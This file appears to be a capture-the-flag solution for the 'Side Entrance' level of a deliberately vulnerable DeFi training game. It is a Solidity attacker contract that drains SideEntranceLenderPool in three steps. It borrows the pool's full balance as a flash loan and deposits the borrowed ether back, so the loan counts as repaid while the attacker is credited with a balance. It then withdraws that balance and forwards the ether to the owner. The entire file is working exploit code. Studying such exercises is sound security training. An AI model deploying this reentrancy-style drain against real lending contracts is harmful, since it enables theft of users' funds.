// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import '../side-entrance/SideEntranceLenderPool.sol';

contract FlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool public pool;
    address public owner;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        owner = msg.sender;
    }

    function flashLoan() external {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdrawFromPool() external payable {
        pool.withdraw();
    }

    receive() external payable {
        payable(owner).sendValue(msg.value);
    }
}
